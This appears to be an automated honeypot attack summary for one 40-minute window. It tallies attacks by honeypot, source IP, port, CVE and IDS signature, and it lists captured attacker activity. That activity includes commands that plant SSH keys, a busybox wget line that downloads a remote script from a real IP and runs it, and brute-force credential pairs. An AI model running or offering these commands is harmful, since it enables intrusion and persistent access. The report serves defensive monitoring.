## Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-07T02:01:34Z
**Timeframe:** 2025-10-07T01:20:01Z to 2025-10-07T02:00:01Z
**Files Used:**
- agg_log_20251007T012001Z.json
- agg_log_20251007T014001Z.json
- agg_log_20251007T020001Z.json

### Executive Summary

This report summarizes 12,771 attacks recorded across three honeypot log files over a 40-minute period. The most targeted honeypots were Cowrie (SSH), Suricata (IDS), and Honeytrap. A significant portion of the attacks originated from IP address `1.0.170.98`. The most frequently targeted ports were TCP/445 (SMB), 5060 (SIP), and 22 (SSH). A notable signature, "ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication," was triggered a large number of times, indicating attempts to exploit the SMB vulnerability.

### Detailed Analysis

**Attacks by Honeypot:**
* Cowrie: 4200
* Suricata: 3380
* Honeytrap: 2909
* Ciscoasa: 1152
* Sentrypeer: 504
* Dionaea: 340
* Mailoney: 36
* Redishoneypot: 34
* H0neytr4p: 29
* Tanner: 26
* Honeyaml: 21
* ConPot: 15
* Adbhoney: 12
* ElasticPot: 7
* Dicompot: 5
* Ipphoney: 1

**Top Attacking IPs:**
* 1.0.170.98: 1661
* 34.47.232.78: 663
* 196.251.88.103: 856
* 172.86.95.98: 489
* 80.94.95.238: 510
* 85.185.112.6: 242
* 147.45.50.33: 193
* 197.5.145.150: 278
* 42.85.194.11: 144
* 14.63.198.239: 194
* 182.18.139.237: 214
* 211.201.163.70: 130
* 14.103.139.157: 160
* 107.170.36.5: 98
* 68.183.207.213: 95
* 3.132.23.201: 85
* 129.13.189.204: 47
* 189.13.2.69: 85
* 3.137.73.221: 36
* 14.103.200.140: 52

**Top Targeted Ports/Protocols:**
* TCP/445: 1659
* 5060: 504
* 22: 660
* 8333: 169
* 23: 99
* 5903: 94
* 445: 283
* TCP/22: 58
* 8000: 40
* 5908: 51
* 5907: 50
* 5909: 49
* 25: 36
* 443: 25
* 6379: 31
* 8080: 21
* 1433: 32
* 4433: 25
* 80: 13
* 1099: 13

**Most Common CVEs:**
* CVE-2002-0013 CVE-2002-0012
* CVE-2019-11500 CVE-2019-11500
* CVE-2023-26801 CVE-2023-26801
* CVE-2009-2765
* CVE-2019-16920 CVE-2019-16920
* CVE-2023-31983 CVE-2023-31983
* CVE-2020-10987 CVE-2020-10987
* CVE-2023-47565 CVE-2023-47565
* CVE-2014-6271
* CVE-2015-2051 CVE-2024-33112 CVE-2022-37056 CVE-2019-10891 CVE-2015-2051
* CVE-1999-0183
* CVE-2002-0013 CVE-2002-0012 CVE-1999-0517

**Commands Attempted by Attackers:**
* cd ~; chattr -ia .ssh; lockr -ia .ssh
* lockr -ia .ssh
* cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..."
* cat /proc/cpuinfo | grep name | wc -l
* Enter new UNIX password:
* uname -a
* whoami
* crontab -l
* w
* top
* rm -rf /data/local/tmp; mkdir -p /data/local/tmp; cd /data/local/tmp/; busybox wget http://213.209.143.62/w.sh; sh w.sh; ...

**Signatures Triggered:**
* ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication: 1655
* ET DROP Dshield Block Listed Source group 1: 560
* ET SCAN MS Terminal Server Traffic on Non-standard Port: 252
* ET SCAN NMAP -sS window 1024: 155
* ET INFO Reserved Internal IP Traffic: 56
* ET SCAN Potential SSH Scan: 39
* ET CINS Active Threat Intelligence Poor Reputation IP group 44: 17
* ET DROP Spamhaus DROP Listed Traffic Inbound group 28: 20
* ET CINS Active Threat Intelligence Poor Reputation IP group 45: 29
* ET CINS Active Threat Intelligence Poor Reputation IP group 46: 21

**Users / Login Attempts:**
* 345gs5662d34/345gs5662d34
* admin/098098
* admin/09111992
* admin/09101990
* root/
* monitor/monitor
* postgres/postgres
* administrator/administrator!@#
* admin/qazplmwsxokn
* admin/r4h4s14
* root/pass123456
* debian/debian
* github/github@2025
* tester/Password123!

**Files Uploaded/Downloaded:**
* wget.sh;
* w.sh;
* c.sh;
* rondo.qre.sh||busybox
* rondo.qre.sh||curl
* rondo.qre.sh)|sh
* discovery
* server.cgi?func=server02_main_submit...
* soap-envelope
* soap-encoding

**HTTP User-Agents:**
* *None Recorded*

**SSH Clients:**
* *None Recorded*

**SSH Servers:**
* *None Recorded*

**Top Attacker AS Organizations:**
* *None Recorded*

### Key Observations and Anomalies

- The high number of triggers for the "DoublePulsar Backdoor" signature suggests a targeted campaign against SMB services.
- Attackers consistently attempted to modify SSH authorized_keys files to gain persistent access. The repeated use of the same SSH key across multiple attacks and IPs suggests a coordinated effort.
- A series of reconnaissance commands (`uname`, `lscpu`, `whoami`, `crontab -l`) were frequently executed, indicating attackers were attempting to gather system information after gaining initial access.
- The IP address `1.0.170.98` was responsible for a large volume of traffic, specifically targeting TCP port 445, which aligns with the DoublePulsar activity.
- A wide variety of usernames and passwords were attempted, ranging from default credentials to more complex combinations, showing a broad-spectrum approach to brute-forcing access.
